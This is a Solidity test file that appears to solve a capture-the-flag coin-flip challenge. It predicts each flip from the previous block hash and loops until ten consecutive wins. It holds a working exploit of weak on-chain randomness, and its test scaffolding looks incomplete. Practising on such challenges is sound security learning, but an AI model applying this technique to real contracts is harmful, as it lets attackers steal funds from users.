// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract HackCoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinflip;

    function setUp() public {
        consecutiveWins = 0;
        coinflip = new CoinFlip();
    }

    function flip() internal returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool success = coinflip.flip(side);

        if (success) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }

    function test_FlipHack() public {
        uint256 flipTimes = 0;
        while (flipTimes < 10) {
            if (flip()) {
                flipTimes++;
            }
        }
    }
}
